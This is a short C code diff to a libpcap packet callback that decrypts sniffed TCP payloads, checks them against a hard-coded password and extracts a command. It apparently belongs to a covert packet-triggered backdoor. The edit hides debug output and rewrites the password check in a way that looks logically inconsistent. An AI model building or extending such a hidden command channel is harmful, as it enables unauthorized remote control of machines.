@@ -69,8 +69,7 @@ int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp){
 }
 
 void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet)
-{
-	static int count = 0;
+{		
 	const struct ip_struct * ip;
 	const struct tcp_struct * tcp;
 	const unsigned char * payload;
@@ -79,12 +78,10 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	int size_tcp;
 	//int size_payload;
 	int mode;
-	printf("Packet received\n");
+	//printf("Packet received\n");
 	char password[strlen(PASSWORD) + 1];
 	char decrypted[PKT_SIZE];
 	char * command;
-
-	count++;
 
 	ip = (struct ip_struct *)(packet + SIZE_ETHERNET);
 	size_ip = IP_HL(ip) * 4;
@@ -122,7 +119,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		return;
 	}
 	// If there happens to be some garbled letters in the decrypted buffer, return immediately
-	if(strcmp(decrypted, password) == 0)
+	if(strcmp(password, PASSWORD) != 0)
 		return;
 
 	printf("Decrypted: %s\n", decrypted);
